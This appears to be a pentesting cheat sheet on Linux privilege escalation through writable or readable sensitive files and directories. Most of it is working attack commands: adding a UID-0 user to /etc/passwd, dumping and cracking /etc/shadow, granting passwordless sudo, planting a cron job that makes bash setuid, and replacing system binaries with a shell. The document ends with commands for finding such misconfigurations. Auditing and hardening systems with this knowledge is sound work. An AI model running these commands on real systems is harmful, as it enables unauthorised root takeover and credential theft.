# Sensitive File / Directory Permissions

## Table of Contents

1. [Overview](#overview)
2. [Writable Sensitive Files](#writable-sensitive-files)
   - [/etc/passwd](#etcpasswd)
   - [/etc/shadow](#etcshadow)
   - [/etc/sudoers](#etcsudoers)
   - [Cron Files](#cron-files)
3. [Writable Directories](#writable-directories)
4. [How to Find Misconfigurations](#how-to-find-misconfigurations)

---

## Overview

Certain system files and directories must have strict permissions. When they are misconfigured (readable or writable by unprivileged users), it can lead to direct privilege escalation.

## Writable Sensitive Files

### /etc/passwd

**Writable** — add a root user or modify an existing one:

```bash
# Add a user with UID 0 (root) and a known password
openssl passwd -1 mypassword
# outputs: $1$xyz$...
echo 'hacker:$1$xyz$...:0:0::/root:/bin/bash' >> /etc/passwd

# Or remove the 'x' from root's entry to clear its password
# root:x:0:0:... → root::0:0:...
```

The `x` in the password field means the hash is in `/etc/shadow`. Replacing it with a generated hash or removing it bypasses shadow entirely.

### /etc/shadow

**Readable** — dump password hashes and crack them offline:

```bash
# Copy and crack with john or hashcat
cat /etc/shadow
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
hashcat -m 1800 shadow.txt rockyou.txt
```

**Writable** — replace a user's password hash:

```bash
# Generate a new hash and replace root's hash
openssl passwd -6 mypassword
# Edit root's line in /etc/shadow with the new hash
```

### /etc/sudoers

**Writable** — give yourself full sudo access:

```bash
echo 'youruser ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
sudo su
```

### Cron Files

**Writable** — inject a malicious cron job:

```bash
# /etc/crontab or files in /etc/cron.d/
echo '* * * * * root chmod +s /bin/bash' >> /etc/crontab
```

Other cron-related writable targets:
- `/etc/cron.d/` — drop a new cron file
- `/var/spool/cron/crontabs/root` — root's personal crontab
- Scripts referenced by existing cron jobs (check with `cat /etc/crontab`)

## Writable Directories

If these directories are writable, you can replace system binaries with malicious ones:

| Directory | Contains |
|---|---|
| `/bin`, `/usr/bin` | User commands (`ls`, `cat`, `sudo`...) |
| `/sbin`, `/usr/sbin` | System/admin binaries (`mount`, `iptables`...) |
| `/lib`, `/usr/lib` | Shared libraries (`.so` files) |
| `/usr/local/bin` | Locally installed binaries (often searched first in `$PATH`) |
| `/etc/init.d/`, `/etc/systemd/` | Service startup scripts |

```bash
# Replace a common binary with a payload
cp /bin/bash /usr/local/bin/ls  # anyone running "ls" gets a bash shell
```

## How to Find Misconfigurations

```bash
# Writable sensitive files
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab 2>/dev/null

# Find world-writable files in /etc
find /etc -writable -type f 2>/dev/null

# Find world-writable directories in system paths
find / -writable -type d 2>/dev/null | grep -E '^/(bin|sbin|usr|lib|etc)'

# Find files with no owner (orphaned, possibly exploitable)
find / -nouser -o -nogroup 2>/dev/null
```
